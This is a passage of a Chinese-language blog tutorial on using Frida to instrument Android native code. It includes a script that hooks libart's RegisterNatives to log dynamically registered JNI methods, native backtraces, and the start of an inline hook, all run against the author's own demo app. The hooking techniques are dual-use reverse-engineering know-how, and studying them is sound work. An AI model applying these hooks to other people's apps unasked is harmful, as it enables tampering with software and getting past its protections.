env-&gt;NewStringUTF(hello.c_str());</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM *vm, <span class="keyword">void</span> *reserved)</span> </span>&#123;</span><br><span class="line">    JNIEnv *env;</span><br><span class="line">    vm-&gt;GetEnv((<span class="keyword">void</span> **) &amp;env, JNI_VERSION_1_6);</span><br><span class="line">    JNINativeMethod methods[] = &#123;</span><br><span class="line">            &#123;<span class="string">"stringFromJNI2"</span>, <span class="string">"()Ljava/lang/String;"</span>, (<span class="keyword">void</span> *) stringFromJNI2&#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    env-&gt;RegisterNatives(env-&gt;FindClass(<span class="string">"myapplication/example/com/ndk_demo/MainActivity"</span>), methods,</span><br><span class="line">                         <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Frida-hook-RegisterNative"><a href="#Frida-hook-RegisterNative" class="headerlink" title="Frida hook RegisterNative"></a>Frida hook RegisterNative</h3><p>使用下面这个脚本来打印出RegisterNatives的参数，这里需要注意的是使用了enumerateSymbolsSync,它是enumerateSymbols的同步版本。<br>另外和我们之前通过<code>Java.vm.tryGetEnv().getStringUtfChars</code>来调用env里的方法不同。<br>这里则是通过将之前找到的getStringUtfChars函数地址和参数信息封装起来，直接调用，具体的原理我没有深入分析，先记住用法。<br>原理其实是一样的，都是<strong>根据符号找到地址，然后hook符号地址，然后打印参数</strong>。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">declare <span class="keyword">const</span> NativeFunction: NativeFunctionConstructor;</span><br><span class="line"></span><br><span class="line">interface NativeFunctionConstructor &#123;</span><br><span class="line">    <span class="keyword">new</span>(address: NativePointerValue, <span class="attr">retType</span>: NativeType, <span class="attr">argTypes</span>: NativeType[], abiOrOptions?: NativeABI | NativeFunctionOptions): NativeFunction;</span><br><span class="line">    readonly prototype: NativeFunction;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">var</span> funcGetStringUTFChars = <span class="keyword">new</span> NativeFunction(addrGetStringUTFChars, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ishook_libart = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hook_libart</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (ishook_libart === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> symbols = Module.enumerateSymbolsSync(<span class="string">"libart.so"</span>);</span><br><span class="line">    <span class="keyword">var</span> addrGetStringUTFChars = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrNewStringUTF = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrFindClass = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrGetMethodID = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrGetStaticMethodID = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrGetFieldID = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrGetStaticFieldID = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrRegisterNatives = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrAllocObject = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrCallObjectMethod = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrGetObjectClass = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">var</span> addrReleaseStringUTFChars = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; symbols.length; i++) &#123;</span><br><span class="line">        <span class="keyword">var</span> symbol = symbols[i];</span><br><span class="line">        <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI17GetStringUTFCharsEP7_JNIEnvP8_jstringPh"</span>) &#123;</span><br><span class="line">            addrGetStringUTFChars = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetStringUTFChars is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI12NewStringUTFEP7_JNIEnvPKc"</span>) &#123;</span><br><span class="line">            addrNewStringUTF = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"NewStringUTF is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI9FindClassEP7_JNIEnvPKc"</span>) &#123;</span><br><span class="line">            addrFindClass = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"FindClass is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI11GetMethodIDEP7_JNIEnvP7_jclassPKcS6_"</span>) &#123;</span><br><span class="line">            addrGetMethodID = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetMethodID is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI17GetStaticMethodIDEP7_JNIEnvP7_jclassPKcS6_"</span>) &#123;</span><br><span class="line">            addrGetStaticMethodID = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetStaticMethodID is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI10GetFieldIDEP7_JNIEnvP7_jclassPKcS6_"</span>) &#123;</span><br><span class="line">            addrGetFieldID = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetFieldID is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI16GetStaticFieldIDEP7_JNIEnvP7_jclassPKcS6_"</span>) &#123;</span><br><span class="line">            addrGetStaticFieldID = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetStaticFieldID is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name == <span class="string">"_ZN3art3JNI15RegisterNativesEP7_JNIEnvP7_jclassPK15JNINativeMethodi"</span>) &#123;</span><br><span class="line">            addrRegisterNatives = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"RegisterNatives is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">"_ZN3art3JNI11AllocObjectEP7_JNIEnvP7_jclass"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            addrAllocObject = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"AllocObject is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125;  <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">"_ZN3art3JNI16CallObjectMethodEP7_JNIEnvP8_jobjectP10_jmethodIDz"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            addrCallObjectMethod = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"CallObjectMethod is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">"_ZN3art3JNI14GetObjectClassEP7_JNIEnvP8_jobject"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            addrGetObjectClass = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"GetObjectClass is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (symbol.name.indexOf(<span class="string">"_ZN3art3JNI21ReleaseStringUTFCharsEP7_JNIEnvP8_jstringPKc"</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            addrReleaseStringUTFChars = symbol.address;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"ReleaseStringUTFChars is at "</span>, symbol.address, symbol.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (addrRegisterNatives != <span class="literal">null</span>) &#123;</span><br><span class="line">        Interceptor.attach(addrRegisterNatives, &#123;</span><br><span class="line">            onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">"[RegisterNatives] method_count:"</span>, args[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">var</span> env = args[<span class="number">0</span>];</span><br><span class="line">                <span class="keyword">var</span> java_class = args[<span class="number">1</span>];</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">var</span> funcAllocObject = <span class="keyword">new</span> NativeFunction(addrAllocObject, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line">                <span class="keyword">var</span> funcGetMethodID = <span class="keyword">new</span> NativeFunction(addrGetMethodID, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line">                <span class="keyword">var</span> funcCallObjectMethod = <span class="keyword">new</span> NativeFunction(addrCallObjectMethod, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line">                <span class="keyword">var</span> funcGetObjectClass = <span class="keyword">new</span> NativeFunction(addrGetObjectClass, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line">                <span class="keyword">var</span> funcGetStringUTFChars = <span class="keyword">new</span> NativeFunction(addrGetStringUTFChars, <span class="string">"pointer"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line">                <span class="keyword">var</span> funcReleaseStringUTFChars = <span class="keyword">new</span> NativeFunction(addrReleaseStringUTFChars, <span class="string">"void"</span>, [<span class="string">"pointer"</span>, <span class="string">"pointer"</span>, <span class="string">"pointer"</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> clz_obj = funcAllocObject(env, java_class);</span><br><span class="line">                <span class="keyword">var</span> mid_getClass = funcGetMethodID(env, java_class, Memory.allocUtf8String(<span class="string">"getClass"</span>), Memory.allocUtf8String(<span class="string">"()Ljava/lang/Class;"</span>));</span><br><span class="line">                <span class="keyword">var</span> clz_obj2 = funcCallObjectMethod(env, clz_obj, mid_getClass);</span><br><span class="line">                <span class="keyword">var</span> cls = funcGetObjectClass(env, clz_obj2);</span><br><span class="line">                <span class="keyword">var</span> mid_getName = funcGetMethodID(env, cls, Memory.allocUtf8String(<span class="string">"getName"</span>), Memory.allocUtf8String(<span class="string">"()Ljava/lang/String;"</span>));</span><br><span class="line">                <span class="keyword">var</span> name_jstring = funcCallObjectMethod(env, clz_obj2, mid_getName);</span><br><span class="line">                <span class="keyword">var</span> name_pchar = funcGetStringUTFChars(env, name_jstring, ptr(<span class="number">0</span>));</span><br><span class="line">                <span class="keyword">var</span> class_name = ptr(name_pchar).readCString();</span><br><span class="line">                funcReleaseStringUTFChars(env, name_jstring, name_pchar);</span><br><span class="line"></span><br><span class="line">                <span class="comment">//console.log(class_name);</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> methods_ptr = ptr(args[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> method_count = <span class="built_in">parseInt</span>(args[<span class="number">3</span>]);</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; method_count; i++) &#123;</span><br><span class="line">                    <span class="keyword">var</span> name_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * <span class="number">3</span>));</span><br><span class="line">                    <span class="keyword">var</span> sig_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * <span class="number">3</span> + Process.pointerSize));</span><br><span class="line">                    <span class="keyword">var</span> fnPtr_ptr = Memory.readPointer(methods_ptr.add(i * Process.pointerSize * <span class="number">3</span> + Process.pointerSize * <span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">var</span> name = Memory.readCString(name_ptr);</span><br><span class="line">                    <span class="keyword">var</span> sig = Memory.readCString(sig_ptr);</span><br><span class="line">                    <span class="keyword">var</span> find_module = Process.findModuleByAddress(fnPtr_ptr);</span><br><span class="line">                    <span class="built_in">console</span>.log(<span class="string">"[RegisterNatives] java_class:"</span>, class_name, <span class="string">"name:"</span>, name, <span class="string">"sig:"</span>, sig, <span class="string">"fnPtr:"</span>, fnPtr_ptr, <span class="string">"module_name:"</span>, find_module.name, <span class="string">"module_base:"</span>, find_module.base, <span class="string">"offset:"</span>, ptr(fnPtr_ptr).sub(find_module.base));</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onLeave: <span class="function"><span class="keyword">function</span> (<span class="params">retval</span>) </span>&#123; &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ishook_libart = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hook_libart();</span><br></pre></td></tr></table></figure><p>结果很明显的打印了出来，包括动态注册的函数的名字，函数签名，加载地址和在so里的偏移量，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[RegisterNatives] java_class: myapplication.example.com.ndk_demo.MainActivity name: stringFromJNI2 sig: ()Ljava&#x2F;lang&#x2F;String; fnPtr: 0x79f8698484 module_name: libnative-lib.so module_base: 0x79f8691000 offset: 0x7484</span><br></pre></td></tr></table></figure><p>最后测试一下yang开源的一个hook art的脚本，很有意思，trace出了非常多的需要的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">frida -U --no-pause -f package_name -l hook_art.js</span><br><span class="line">...</span><br><span class="line">[FindClass] name:myapplication&#x2F;example&#x2F;com&#x2F;ndk_demo&#x2F;Test</span><br><span class="line">[GetStaticFieldID] name:publicStaticField, sig:Ljava&#x2F;lang&#x2F;String;</span><br><span class="line">[GetStringUTFChars] result:i am a publicStaticField</span><br><span class="line">[NewStringUTF] bytes:Hello from C++ stringFromJNI2</span><br><span class="line">[GetStringUTFChars] result:sakura</span><br></pre></td></tr></table></figure><h3 id="native层调用栈打印"><a href="#native层调用栈打印" class="headerlink" title="native层调用栈打印"></a>native层调用栈打印</h3><p>直接使用frida提供的接口打印栈回溯。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Interceptor.attach(f, &#123;</span><br><span class="line">  onEnter: <span class="function"><span class="keyword">function</span> (<span class="params">args</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'RegisterNatives called from:\n'</span> +</span><br><span class="line">        Thread.backtrace(<span class="keyword">this</span>.context, Backtracer.ACCURATE)</span><br><span class="line">        .map(DebugSymbol.fromAddress).join(<span class="string">'\n'</span>) + <span class="string">'\n'</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>效果如下,我加到了hook registerNative的地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[Google Pixel::myapplication.example.com.ndk_demo]-&gt; RegisterNatives called from:</span><br><span class="line">0x7a100be03c libart.so!0xe103c</span><br><span class="line">0x7a100be038 libart.so!0xe1038</span><br><span class="line">0x79f85699a0 libnative-lib.so!_ZN7_JNIEnv15RegisterNativesEP7_jclassPK15JNINativeMethodi+0x44</span><br><span class="line">0x79f85698e0 libnative-lib.so!JNI_OnLoad+0x90</span><br><span class="line">0x7a102b9fd4 libart.so!_ZN3art9JavaVMExt17LoadNativeLibraryEP7_JNIEnvRKNSt3__112basic_stringIcNS3_11char_traitsIcEENS3_9allocatorIcEEEEP8_jobjectP8_jstringPS9_+0x638</span><br><span class="line">0x7a08e3820c libopenjdkjvm.so!JVM_NativeLoad+0x110</span><br><span class="line">0x70b921c4 boot.oat!oatexec+0xa81c4</span><br></pre></td></tr></table></figure><h3 id="主动调用去进行方法参数替换"><a href="#主动调用去进行方法参数替换" class="headerlink" title="主动调用去进行方法参数替换"></a>主动调用去进行方法参数替换</h3><p>使用<code>Interceptor.replace</code>，不赘述。主要目的还是为了改掉函数原本的执行行为，而不是仅仅打印一些信息。</p><h3 id="inline-hook"><a href="#inline-hook" class="headerlink" title="inline hook"></a>inline hook</h3><p>inline hook简单理解就是不是hook函数开始执行的地方，而是hook函数中间执行的指令<br>整体来说没什么区别，就是把找函数符号地址改成从so里找到偏移，然后加到so基地址上就行,注意一下它的attach的callback。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Callback to invoke when an instruction is about to be executed.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">type InstructionProbeCallback = <span class="function">(<span class="params"><span class="keyword">this</span>: InvocationContext, args: InvocationArguments</span>) =&gt;</span> <span class="keyword">void</span>;</span><br><span class="line">type InvocationContext = PortableInvocationContext | WindowsInvocationContext | UnixInvocationContext;</span><br><span class="line"></span><br><span class="line">interface PortableInvocationContext &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Return address.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    returnAddress: NativePointer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * CPU registers. You may also update register values by assigning to these keys.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    context: CpuContext;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * OS thread ID.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    threadId: ThreadId;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Call depth of relative to other invocations.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    depth: number;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * User-defined invocation data. Useful if you want to read an argument in `onEnter` and act on it in `onLeave`.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    [x: string]: any;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">interface Arm64CpuContext extends PortableCpuContext &#123;</span><br><span class="line">    x0: NativePointer;</span><br><span class="line">    x1: NativePointer;</span><br><span class="line">    x2: NativePointer;</span><br><span class="line">    x3: NativePointer;</span><br><span class="line">    x4: NativePointer;</span><br><span class="line">    x5: NativePointer;</span><br><span class="line">    x6: NativePointer;</span><br><span class="line">    x7: NativePointer;</span><br><span class="line">    x8: NativePointer;</span><br><span class="line">    x9: NativePointer;</span><br><span class="line">    x10: NativePointer;</span><br><span class="line">    x11: NativePointer;</span><br><span class="line">    x12: NativePointer;</span><br><span class="line">    x13: NativePointer;</span><br><span class="line">    x14: NativePointer;</span><br><span class="line">    x15: NativePointer;</span><br><span class="line">    x16: NativePointer;</span><br><span class="line">    x17: NativePointer;</span><br><span class="line">    x18: NativePointer;</span><br><span class="line">    x19: NativePointer;</span><br><span class="line">    x20: NativePointer;</span><br><span class="line">    x21: NativePointer;</span><br><span class="line">    x22: NativePointer;</span><br><span class="line">    x23: NativePointer;</span><br><span class="line">    x24: NativePointer;</span><br><span class="line">    x25: NativePointer;</span><br><span class="line">    x26: NativePointer;</span><br><span class="line">    x27: NativePointer;</span><br><span class="line">    x28: NativePointer;</span><br><span class="line"></span><br><span class="line">    fp: NativePointer;</span><br><span class="line">    lr: NativePointer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我的so是自己编译的，具体的汇编代码如下,总之这里很明显在775C时，x0里保存的是一个指向”sakura”这个字符串的指针。(其实我也不是很看得懂arm64了已经，就随便hook了一下)<br>所以hook这个指令，然后<code>Memory.readCString(this.context.x0);</code>打印出来，结果如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000772</span>C ; __unwind &#123;</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000772</span>C                 SUB             SP, SP, #<span class="number">0x40</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007730</span>                 STP             X29, X30, [SP,#<span class="number">0x30</span>+var_s0]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007734</span>                 ADD             X29, SP, #<span class="number">0x30</span></span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007738</span> ; <span class="number">6</span>:   v6 = a1;</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007738</span>                 MOV             X8, XZR</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000773</span>C                 STUR            X0, [X29,#var_8]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007740</span> ; <span class="number">7</span>:   v5 = a3;</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007740</span>                 STUR            X1, [X29,#var_10]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007744</span>                 STR             X2, [SP,#<span class="number">0x30</span>+var_18]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007748</span> ; <span class="number">8</span>:   v4 = (<span class="keyword">const</span> <span class="keyword">char</span> *)_JNIEnv::GetStringUTFChars(a1, a3, <span class="number">0L</span>L);</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007748</span>                 LDUR            X0, [X29,#var_8]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000774</span>C                 LDR             X1, [SP,#<span class="number">0x30</span>+var_18]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007750</span>                 MOV             X2, X8</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007754</span>                 BL              ._ZN7_JNIEnv17GetStringUTFCharsEP8_jstringPh ; _JNIEnv::GetStringUTFChars(_jstring *,uchar *)</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007758</span>                 STR             X0, [SP,#<span class="number">0x30</span>+var_20]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000775</span>C ; <span class="number">9</span>:   <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)_JNIEnv::GetStringUTFLength(v6, v5) &gt; <span class="number">0</span> )</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">000000000000775</span>C                 LDUR            X0, [X29,#var_8]</span><br><span class="line">.<span class="built_in">text</span>:<span class="number">0000000000007760</span>                 LDR             X1, [SP,#<span class="number">0x30</span>+var_18]</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inline_hook</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> libnative_lib_addr = Module.findBaseAddress(<span class="string">"libnative-lib.so"</span>);</span><br><span class="line">    <span class="keyword">if</span> (libnative_lib_addr) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"libnative_lib_addr:"</span>, 